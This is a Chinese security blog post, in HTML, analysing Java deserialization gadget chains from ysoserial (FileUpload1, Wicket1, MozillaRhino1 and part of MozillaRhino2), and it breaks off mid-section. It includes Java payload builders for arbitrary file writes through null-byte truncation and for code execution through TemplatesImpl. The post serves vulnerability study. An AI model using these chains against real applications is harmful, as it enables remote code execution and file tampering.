@@ -1,0 +1,868 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java 反序列化漏洞（四） - FileUpload/Wicket/MozillaRhino/Myfaces | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java 反序列化漏洞（四） - FileUpload/Wicket/MozillaRhino/Myfaces
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-07-27
+              </span>
+              <span>
+                26 min read
+              </span>
+              
+                <a href="https://su18.org/tag/YWv10I0qb/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/ysoserial-su18-4.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="fileupload1">FileUpload1</h1>
+<p>FileUpload 组件是 Apache 提供的上传组件，它本身依赖于 commons-io 组件，ysoserial 中利用了这个组件来任意写、读文件或者目录。但是具体是对文件还是目录操作与 FileUpload 以及 JDK 的版本有关。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="diskfileitem">DiskFileItem</h3>
+<p><code>org.apache.commons.fileupload.FileItem</code> 表示在 <code>multipart/form-data</code> POST 请求中接收到的文件或表单项。</p>
+<p>而 <code>org.apache.commons.fileupload.disk.DiskFileItem</code> 是 FileItem 的实现类，用来封装一个请求消息实体中的全部项目，在 <code>FileUploadBase#parseRequest</code> 解析时进行封装，动作由 DiskFileItemFactory 的 <code>createItem</code> 方法来完成。</p>
+<p>当上传的文件项目比较小时，直接保存在内存中（速度比较快），比较大时，以临时文件的形式，保存在磁盘临时文件夹。</p>
+<p>而在这个过程中，就用到了几个 DiskFileItem 类中的属性：</p>
+<ul>
+<li>repository：File 类型的成员变量，如果文件保存到硬盘上的话，保存的位置。</li>
+<li>sizeThreshold：文件大小阈值，如果超过这个值，上传文件将会被储存在硬盘上。</li>
+<li>fileName：原始文件名</li>
+<li>dfos：一个 DeferredFileOutputStream 对象，用于 OutputStream 的写出</li>
+<li>dfosFile：一个 File 对象，允许对其序列化的操作</li>
+</ul>
+<p>DiskFileItem 重写了 <code>readObject</code> 方法实现了自己的逻辑，用于在 JVM 之间迁移一个包含 DiskFileItem 的 HTTP 会话。在类的注释中还特别强调，在不同机器中文件储存位置 repository 可能不同，需要验证。也就是说如果反序列化一个带数据的 DiskFileItem 类，就可能会触发文件的写出操作。</p>
+<p>首先看一下 DiskFileItem 的序列化逻辑是怎么写的：</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1627615134575.png" alt="" loading="lazy"></figure>
+<p>逻辑也很清楚，描述一下：</p>
+<ul>
+<li>通过 <code>dfos.isInMemory()</code> 方法判断文件内容是否是在内存中，其实也就是通过判断 written 的长度和 threshold 阈值长度大小，如果写入大于阈值，则会被写出到文件中，那就不是存在内存中了。<br>
+<img src="https://su18.org/post-images/1627615312301.png" alt="" loading="lazy"></li>
+<li>如果在内存中，则会调用  <code>dfos.getData()</code> 方法获取存在 dfos 成员变量 memoryOutputStream 的 ByteArrayOutputStream 对象放在 cachedContent 中。</li>
+<li>如果不在内存中，则会将 cachedContent 置为空，然后将 dfosFile 赋值为 dfos 的成员变量 outputFile 对象。</li>
+</ul>
+<p>由于 dfos 是 transient 修饰的，不能被反序列化，所以能被反序列化的有 byte 数组类型的 cachedContent 和 File 对象的 dfosFile。</p>
+<p>接下来迫不及待的看一下 <code>readObject</code> 的代码实现。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1627636485380.png" alt="" loading="lazy"></figure>
+<p>逻辑非常清晰，用文字描述一下：</p>
+<ul>
+<li>调用 <code>getOutputStream()</code> 方法获取 OutputStream 对象，实际上是 new 了一个 DeferredFileOutputStream 对象，文件路径使用 tempFile，如果为空使用 repository，如果还为空则使用 <code>System.getProperty(&quot;java.io.tmpdir&quot;)</code>，文件名使用 <code>format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId())</code> 生成随机的文件名。</li>
+<li>如果 cachedContent 不为空，则直接 write，否则将 dfosFile 文件内容拷贝到 OutputStream 中写出，并删除。</li>
+</ul>
+<p>在了解的序列化和反序列化过程后，我们就可以通过控制 DiskFileItem 类中的属性来利用反序列化写出文件。</p>
+<h2 id="攻击构造">攻击构造</h2>
+<pre><code class="language-java">public class FileUploadForWrite {
+
+	public static String fileName = &quot;FileUploadForWrite.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 创建文件写入目录 File 对象，以及文件写入内容
+		String charset = &quot;UTF-8&quot;;
+		byte[] bytes   = &quot;hahaha&quot;.getBytes(charset);
+
+		// 在 1.3 版本以下，可以使用 \0 截断
+		File repository = new File(&quot;/Users/phoebe/Downloads/123.txt\0&quot;);
+
+		// 在 1.3.1 及以上，只能指定目录
+//		File   repository = new File(&quot;/Users/phoebe/Downloads&quot;);
+
+		// 创建 dfos 对象
+		DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+
+		// 使用 repository 初始化反序列化的 DiskFileItem 对象
+		DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+
+		// 序列化时 writeObject 要求 dfos 不能为 null
+		Field dfosFile = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+		dfosFile.setAccessible(true);
+		dfosFile.set(diskFileItem, dfos);
+
+		// 反射将 cachedContent 写入
+		Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+		field2.setAccessible(true);
+		field2.set(diskFileItem, bytes);
+
+		SerializeUtil.writeObjectToFile(diskFileItem, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>在 1.3.1 版本中，官方对空字节截断进行了修复，在 readObject 中，判断成员变量 repository 是否为空，不为空的情况下判断是不是目录，并判断目录路径中是否包含 <code>\0</code> 空字符。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1627608561773.png" alt="" loading="lazy"></figure>
+<p>那在这种情况下，就不能实现任意文件的写入，只能指定目录写入内容，而文件名只能是按照代码规则去生成。</p>
+<p>之前在分析 DiskFileItem 的 readObject 时提到，在 cachedContent 为 空的情况，则会将 dfosFile 中的内容进行拷贝，并调用其 delete 方法删除。那利用这段代码，就可以完成任意文件的移动，漏洞作者 mbechler 称其为 copyAndDelete 。</p>
+<p>非常简单且无趣，这里不贴代码了。</p>
+<h2 id="总结">总结</h2>
+<p>以上就是 FileUpload 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用了 DiskFileItem 反序列化时会将写出文件的特性实施攻击，借助 JDK 的空字节截断即可完成任意文件写入和任意文件移动的漏洞调用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.apache.commons.fileupload.disk.DiskFileItem#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.fileupload.disk.DiskFileItem#getOutputStream()</code></li>
+<li>chain gadget：<code>org.apache.commons.beanutils.BeanComparator#compare()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>DiskFileItem.readObject()
+    DiskFileItem.getOutputStream()
+            DeferredFileOutputStream.write()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-fileupload : 1.3.x<br>
+commons-io : 2.4</p>
+</blockquote>
+<h1 id="wicket1">Wicket1</h1>
+<p>由于 Apache Wicket 抄了 FileUpload 的代码，所以有了这条链，除了包名不同，其他调用一模一样。不再重复。（真能水啊...）</p>
+<h1 id="mozillarhino1">MozillaRhino1</h1>
+<p>漏洞介绍：<a href="https://codewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html">博客</a></p>
+<p>Rhino 是完全使用 Java 编写的 JavaScript 的开源实现，最初由 Mozilla 开发，后被集成至 JDK，此项目进一步扩展了 Java 的动态性，使 Java 可以调用 js 脚本，实现脚本语言与 Java 语言的数据交换。Rhino 的 ScriptEngine 经常被用来进行 JVM 沙箱逃逸。</p>
+<p>Oracle JRE 6/7 捆绑了 Rhino 的旧分支（sun.org.mozilla.* 下的软件包），Oracle 使用 JRE7u13对 Rhino 核心类进行了一些强化，使其不再可序列化。这些更改是为了修复 James Forshaw 的沙箱逃逸 (CVE-2012-3213)，但是这些改变并没有被纳入 Mozilla 的 Rhino 中，因此，如果使用了与 Ubuntu 或 Debian 捆绑在一起的 OpenJdk，则可能依然存在此条利用链。</p>
+<h2 id="前置知识-2">前置知识</h2>
+<p>在 Rhino 中，几乎每个 Javascript 的对象，都会表示为 Java 中的 ScriptableObject。这个 Java 类时 Scriptable 接口的默认实现，同时实现了 Serializable 接口。这个类提供了很多方法，可以很方便地使用这些方法定义 Javascript 对象的各种属性和方法。</p>
+<p>这个类中有个我们需要关注的成员变量 slots： Slot 类型的数组。</p>
+<p>Slot 有一个 GetterSlot 子类，里面添加了 getter/setter 两个属性。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1627871245359.png" alt="" loading="lazy"></figure>
+<h3 id="nativeerror">NativeError</h3>
+<p><code>org.mozilla.javascript.NativeError</code> 继承自 IdScriptableObject，后者也是 ScriptableObject 的子类。因此 NativeError 是可以进行序列化和反序列化操作的。</p>
+<p>NativeError 的 <code>toString</code> 方法调用了 <code>js_toString</code> 方法，参数是 this。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1627869865964.png" alt="" loading="lazy"></figure>
+<p>调用了两次 <code>getString()</code>，分别获取 this 对象的 “name” 和 “message” 的相关属性。<code>getString</code> 方法调用 <code>ScriptableObject.getProperty()</code> 从一个 Scriptable 对象中获取。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1627870009469.png" alt="" loading="lazy"></figure>
+<p>实际上就是通过 Scriptable 对象本身的 <code>get()</code> 方法来来索引属性值。</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1627870219911.png" alt="" loading="lazy"></figure>
+<p>NativeError 没有 <code>get</code> 方法，会调用其父类的 IdScriptableObject 的 <code>get</code> 方法，会继续调用其父类 ScriptableObject 的 <code>get</code> 方法。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1627870585419.png" alt="" loading="lazy"></figure>
+<p>ScriptableObject 的 <code>get</code> 方法调用 <code>getImpl()</code> 方法。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1627870664595.png" alt="" loading="lazy"></figure>
+<p>在 <code>getImpl()</code> 方法中是比较重要的触发点逻辑，首先通过 <code>getSlot()</code> 方法获取 Slot 对象，如果 Slot 是 GetterSlot 实例，则获取其中的 getter 实例，如果 getter 实例是 MemberBox ，则调用其 invoke 方法反射调用。如果</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1627870660099.png" alt="" loading="lazy"></figure>
+<p>在反射调用时，传入的对象和参数有如下逻辑：</p>
+<ul>
+<li>如果 MemberBox 的 delegateTo 为空，则传递给 invoke 的对象为 start，调用参数为 <code>ScriptRuntime.emptyArgs</code>，也就是空。</li>
+<li>否则传递给 invoke 的对象为 delegateTo，而 start 作为参数传入。</li>
+</ul>
+<p>而在 MemberBox 的构造方法初始化时，是不会实例化 delegateTo 这个成员变量的，因为他是 transient 修饰的，且没有处理， 所以程序在反序列化时只能走上述第一个逻辑，这就导致了我们无法控制期望的调用目标对象函数，只能是调用链最开始的 NativeError 的 this 对象。</p>
+<p>所以这里把注意力放在 else 分支上，如果 getter 是 Function 类型，则会调用其 call 方法，这里需要注意的是，传入的参数对象为 <code>ScriptRuntime.emptyArgs</code>。</p>
+<h3 id="nativejavamethod">NativeJavaMethod</h3>
+<p><code>org.mozilla.javascript.NativeJavaMethod</code> 类是 Function 接口的实现，同时也是 IdScriptableObject 的子类，这个类在实例化时接收 MemberBox 对象，并存储在 <code>this.methods</code> 这个 MemberBox 数组中。</p>
+<p>在 NativeJavaMethod 的 call 方法中，通过 findFunction 方法根据参数和上下文在  <code>this.methods</code> 中找到对应的 MemberBox，并调用其 invoke 方法。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1627886963787.png" alt="" loading="lazy"></figure>
+<p>那么现在的难点在于，如何控制 javaObject 的值，程序里需要判断从参数传入的 thisObj 是一个 Wrapper 对象，调用其 unwrap 方法之后返回 javaObject。</p>
+<p>而这个 thisObject 则是从之前的调用中传入的 NativeError 对象，并不满足要求。</p>
+<p>但是我们发现，这是一个 <code>for (;;)</code> 的无限循环，如果没有找到合适的 javaObject，则会调用 <code> o.getPrototype()</code> 返回 prototypeObject 成员变量再次判断。</p>
+<p>此时如果我们找到一个类，这个类是 Scriptable 的实现类，同时是 Wrapper 实例，其 unwrap 方法返回 Java 对象可控，那就可以成功触发利用链了。</p>
+<h3 id="memberbox">MemberBox</h3>
+<p><code>org.mozilla.javascript.MemberBox</code> 的 <code>invoke()</code> 方法接收 target 对象和参数 Object 数组，然后反射调用。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1627871493093.png" alt="" loading="lazy"></figure>
+<p>借助 MemberBox 类，就可以触发恶意漏洞。</p>
+<p>虽然 MemberBox 的 memberObject 属性由 transient 修饰，表面上看起来好像是不能在 read/writeObject 时序列化和反序列化，但是实际上 MemberBox 又自己实现了 <code>writeMember()</code> /<code>readMember()</code> 方法，在序列化和反序列化时进行了调用，所以其实是没问题的。</p>
+<h3 id="nativejavaobject">NativeJavaObject</h3>
+<p><code>org.mozilla.javascript.NativeJavaObject</code> 类实现了  Scriptable, Wrapper, Serializable 三个接口，非常符合我们的要求，并且其 unwrap 方法直接返回 Object 类型的成员变量 javaObject。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1627888115318.png" alt="" loading="lazy"></figure>
+<p>与 MemberBox 类似，虽然成员变量 javaObject 由 transient 修饰，但在  read/writeObject 时自定义了相关处理逻辑，对象可以被保存。</p>
+<h2 id="攻击构造-2">攻击构造</h2>
+<p>通过上面几个类调用情况的解析，已经找到了完整的利用链。那该如何触发 NativeError 的 <code>toString</code> 方法呢？这时想起了 CC5 的 BadAttributeValueExpException。</p>
+<p>因此最终的攻击构造为：</p>
+<pre><code class="language-java">public class MozillaRhino1 {
+
+	public static String fileName = &quot;MozillaRhino1.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 实例化 NativeError 类
+		Class&lt;?&gt;       nativeErrorClass       = Class.forName(&quot;org.mozilla.javascript.NativeError&quot;);
+		Constructor&lt;?&gt; nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
+		nativeErrorConstructor.setAccessible(true);
+		Scriptable nativeError = (Scriptable) nativeErrorConstructor.newInstance();
+
+		// 使用恶意类 TemplatesImpl 初始化 NativeJavaObject
+		// 这样 unwrap 时会返回 tmpl 实例
+		// 由于 NativeJavaObject 序列化时会调用 initMembers() 方法
+		// 所以需要在实例化 NativeJavaObject 时也进行相关初始化
+		Context          context          = Context.enter();
+		NativeObject     scriptableObject = (NativeObject) context.initStandardObjects();
+		NativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, tmpl, TemplatesImpl.class);
+
+		// 使用 newTransformer 的 Method 对象实例化 NativeJavaMethod 类
+		Method           newTransformer   = TemplatesImpl.class.getDeclaredMethod(&quot;newTransformer&quot;);
+		NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, &quot;name&quot;);
+
+		// 使用反射将 nativeJavaObject 写入到 NativeJavaMethod 实例的 prototypeObject 中
+		Field prototypeField = ScriptableObject.class.getDeclaredField(&quot;prototypeObject&quot;);
+		prototypeField.setAccessible(true);
+		prototypeField.set(nativeError, nativeJavaObject);
+
+		// 将 GetterSlot 放入到 NativeError 的 slots 中
+		Method getSlot = ScriptableObject.class.getDeclaredMethod(&quot;getSlot&quot;, String.class, int.class, int.class);
+		getSlot.setAccessible(true);
+		Object slotObject = getSlot.invoke(nativeError, &quot;name&quot;, 0, 4);
+
+		// 反射将 NativeJavaMethod 实例放到 GetterSlot 的 getter 里
+		// ysoserial 调用了 setGetterOrSetter 方法，我这里直接反射写进去，道理都一样
+		Class&lt;?&gt; getterSlotClass = Class.forName(&quot;org.mozilla.javascript.ScriptableObject$GetterSlot&quot;);
+		Field    getterField     = getterSlotClass.getDeclaredField(&quot;getter&quot;);
+		getterField.setAccessible(true);
+		getterField.set(slotObject, nativeJavaMethod);
+
+		// 生成 BadAttributeValueExpException 实例，用于反序列化触发 toString 方法
+		BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;su18&quot;);
+		Field                         valField  = exception.getClass().getDeclaredField(&quot;val&quot;);
+		valField.setAccessible(true);
+		valField.set(exception, nativeError);
+
+		SerializeUtil.writeObjectToFile(exception, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>这里有一点坑，在 NativeJavaObject 反序列化时，会调用 <code>initMembers()</code> 方法调用 <code>JavaMembers.lookupClass()</code> 方法来查询对应 Java 对象的 Method、fieldAndMethods 等信息，为了避免其报错，在实例化时执行相应流程来满足对应需要的对象。</p>
+<h2 id="总结-2">总结</h2>
+<p>以上就是 MozillaRhino1 链分析的全部内容了，真的是一条比较复杂的利用链，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用了 BadAttributeValueExpException 反序列化时调用 NativeError 的 toString 方法，进而调用了 ScriptableObject 的 getImpl 方法，其中调用了 NativeJavaMethod 的 call 方法，利用 NativeJavaObject 返回 TemplatesImpl 对象，最后借助 MemberBox 的 invoke 方法完成反射调用触发恶意代码。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>javax.management.BadAttributeValueExpException#readObject()</code></li>
+<li>sink gadget：<code>org.mozilla.javascript.MemberBox#invoke()</code></li>
+<li>chain gadget：<code>org.mozilla.javascript.NativeJavaMethod#call()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>BadAttributeValueExpException.readObject()
+    NativeError.toString()
+        ScriptableObject.getProperty()
+            ScriptableObject.getImpl()
+                NativeJavaMethod.call()
+                    NativeJavaObject.unwrap()
+                        MemberBox.invoke()
+                            TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>rhino-js : 1.7R2</p>
+</blockquote>
+<h1 id="mozillarhino2">MozillaRhino2</h1>
+<p>MozillaRhino2 移除了对 BadAttributeValueExpException 触发点的限制，借助了 JavaMembers 来获取和触发指定的类方法。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="javamembers">JavaMembers</h3>
+<p><code>org.mozilla.javascript.JavaMembers</code> 是 Rhino 对 Java Class的一种封装和描述。</p>
+<p>JavaMembers 实例化时接收一个 Scriptable 对象，一个 Class 类型的对象，和一个布尔类型的参数 includeProtected 表示是否包含 “Protect” 修饰符的，调用 <code>reflect()</code> 方法获取类的信息并放入自己的相关成员变量中。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1627952446029.png" alt="" loading="lazy"></figure>
+<p>其中包括：</p>
+<ul>
+<li>调用 <code>discoverAccessibleMethods()</code> 方法获取类中的全部 Method，如果是静态方法，则将方法名和 Method 对象映射的 Map 放入 staticMembers 中，否则放入 members 中。<br>
+<img src="https://su18.org/post-images/1627955111165.png" alt="" loading="lazy"></li>
+<li>然后把 staticMembers 和 members 中的 Method 实例用 NativeJavaMethod 作为 Wrapper 进行封装，这样 staticMembers 和 members 中就变成了方法名和 NativeJavaMethod 实例的映射。<br>
+<img src="https://su18.org/post-images/1627955133266.png" alt="" loading="lazy"></li>
+<li>接下来对 Field 进行映射，依旧是区分是否静态并存放在 staticMembers 和 members 中，如果 field 名和 method 名重复，则使用 FieldAndMethods 对象来同时封装二者。<br>
+<img src="https://su18.org/post-images/1627955192078.png" alt="" loading="lazy"></li>
+<li>接下来是对 get/set 方法进行提取和封装，对所有 get/set/is 开头 的方法名进行提取，去除前缀并将第一位字母改为小写，作为 beanPropertyName，然后获取在  staticMembers 和 members 中查找属性对应的 get/set/is 方法的映射，如果有 NativeJavaMethod 的值，在其中找到无参且有返回值的方法。<br>
+<img src="https://su18.org/post-images/1627957502162.png" alt="" loading="lazy"></li>
+<li>使用获得的 getter/setter 实例化 BeanProperty ，并用 beanPropertyName 和映射存放在  staticMembers 和 members  中。<br>
+<img src="https://su18.org/post-images/1627956819649.png" alt="" loading="lazy"></li>
+<li>最后映射构造方法，使用 MemberBox 包裹后存入 ctors。<br>
+<img src="https://su18.org/post-images/1627955297815.png" alt="" loading="lazy"></li>
+</ul>
+<p>经过了 JavaMembers 的初始化后，可以说一个 Java Class 的相关信息被储存和封装在了这个 JavaMembers 中。JavaMembers 提供了很多方法来查询和提取相应的对象以供调用。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1627960572968.png" alt="" loading="lazy"></figure>
+<p>其中有一个 static 方法 <code>lookupClass()</code>，为 JavaMembers 对象提供了缓存功能，如果有，则从ClassCache 中提取，如果没有，则 new 一个 JavaMembers 并放在响应的缓存中。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1627960671352.png" alt="" loading="lazy"></figure>
+<p>JavaMembers 还提供了一个 <code>get()</code> 方法，是本条链最重要的触发点，简单来说，这个方法接收一个属性名，和一个类实例，然后使用反射去调用这个属性的 getter 方法，然后根据返回值的类型不同，使用自己的类去 Wrap 这个返回值，如 Array 用 NativeJavaArray， Object 的用 NativeJavaObject。</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1627961734202.png" alt="" loading="lazy"></figure>
+<p>那既然如此，就可以使用这个方法来触发 TemplatesImpl 的 getOutputProperties 方法。测试代码如下：</p>
+<pre><code class="language-java">TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+Context      context          = Context.enter();
+NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
+
+Class&lt;?&gt; c = Class.forName(&quot;org.mozilla.javascript.JavaMembers&quot;);
+Method   m = c.getDeclaredMethod(&quot;lookupClass&quot;, Scriptable.class, Class.class, Class.class, boolean.class);
+m.setAccessible(true);
+Object o = m.invoke(null, scriptableObject, TemplatesImpl.class, TemplatesImpl.class, true);
+
+Method m2 = c.getDeclaredMethod(&quot;get&quot;, Scriptable.class, String.class, Object.class, boolean.class);
+m2.setAccessible(true);
+m2.invoke(o, scriptableObject, &quot;outputProperties&quot;, tmpl, false);
+</code></pre>
+<h3 id="nativejavaobject-2">NativeJavaObject</h3>
+<p>在 MozillaRhino1 中，使用了 NativeJavaObject 作为 Wrapper 类来返回恶意的 javaObject，也就是 TemplatesImpl，当时仅仅是关注了 NativeJavaObject 同时实现了 Wrapper 和 Scriptable 这两个接口，这里来详细看一下。</p>
+<p>NativeJavaObject 是一个对非 Array 类型的 Java Object 的封装，构造方法接收 javaObject 对象，staticType Class对象，调用 <code>initMembers()</code>  方法来封装和获取相关信息。</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1627968527339.png" alt="" loading="lazy"></figure>
+<p><code>initMembers()</code>  方法调用了 <code>JavaMembers.lookupClass()</code> 来执行之前描述过的解析过程，而将生成的结果存在成员变量 member 中。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1627968662327.png" alt="" loading="lazy"></figure>
+<p>而 NativeJavaObject 的 get 方法则调用了 JavaMembers 的 get 方法。</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1627968842928.png" alt="" loading="lazy"></figure>
+<p>那其实就可以通过 NativeJavaObject 的 get 方法来直接出发恶意调用，测试代码如下：</p>
+<pre><code class="language-java">TemplatesImpl    tmpl             = SerializeUtil.generateTemplatesImpl();
+Context          context          = Context.enter();
+NativeObject     scriptableObject = (NativeObject) context.initStandardObjects();
+NativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, tmpl, TemplatesImpl.class);
+nativeJavaObject.get(&quot;outputProperties&quot;, scriptableObject);
+</code></pre>
+<p>除此之外，NativeJavaObject 实现了 Serializable 接口，重写了 readObject 方法，在反序列化过程中，会判断 isAdapter 标志位，如果为 true，则会调用反射调用 adapter_readAdapterObject 传入 this 对象和 ObjectInputStream。</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1627960907310.png" alt="" loading="lazy"></figure>
+<p>而这个 adapter_readAdapterObject 实际上是 <code>org.mozilla.javascript.JavaAdapter</code> 的 <code>readAdapterObject</code> 方法，在 NativeJavaObject 的 static 语句进行了初始化。</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1627972494402.png" alt="" loading="lazy"></figure>
+<p>也就是说，在 isAdapter 为 false 时，NativeJavaObject 使用自己的逻辑反序列化，而 isAdapter 为 true 时，NativeJavaObject 委托 JavaAdapter 为其反序列化。跟一下调用逻辑：</p>
+<p>readAdapterObject 从 ObjectInputStream 中读取数据，调用 <code>getAdapterClass()</code> 获取 Adapter 对象的 Class，并通过反射调用指定参数的构造方法进行实例化， <code>getAdapterClass()</code> 方法接收的第四个参数 delegee 其实就是 NativeJavaObject 中的 javaObject。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1627974482045.png" alt="" loading="lazy"></figure>
+<p><code>getAdapterClass()</code> 方法调用了 getObjectFunctionNames 方法返回 ObjToIntMap 对象。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1627974764163.png" alt="" loading="lazy"></figure>
+<p>而 getObjectFunctionNames 方法调用了  <code>ScriptableObject.getProperty()</code> 方法，会触发对象的 get 方法。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1627974876431.png" alt="" loading="lazy"></figure>
+<p>此时，如果 obj 是带有恶意 javaObjet 的 NativeJavaObject，而 id 是 “outputProperties”，岂不是就触发漏洞了吗？</p>
+<p>想的很美，但是 id 并非传参，而是使用了 <code>ScriptableObject.getPropertyIds(obj)</code> 返回的字符串类型数组循环得到的。</p>
+<p><code>ScriptableObject.getPropertyIds()</code>  方法实际调用 obj 的 <code>getIds()</code>，而如果 obj 是 NativeJavaObject ，将会调用 JavaMembers 的 <code>getIds</code> 方法。</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1627976378265.png" alt="" loading="lazy"></figure>
+<p>方法会返回所有非静态 member 储存 Map 的 key，实际上 JavaMembers 对象初始化时储存的全部成员变量和方法的 name 。</p>
+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1627976333890.png" alt="" loading="lazy"></figure>
+<p>这种情况下，如果 obj 为 NativeJavaObject ，ids 中确实可以包含 outputProperties，但是由于后续会触发 invoke 方法调用，for 循环还没执行到那一步就会报错。所以还是没办法触发调用。</p>
+<figure data-type="image" tabindex="28"><img src="https://su18.org/post-images/1627978345389.png" alt="" loading="lazy"></figure>
+<p>于是我们需要想办法让 <code>ScriptableObject.getPropertyIds()</code> 这个方法只返回一个值。</p>
+<h3 id="nativejavaarray-environment">NativeJavaArray + Environment</h3>
+<p>NativeJavaArray 是 NativeJavaObject 的子类，满足 NativeJavaObject 的一切特征。</p>
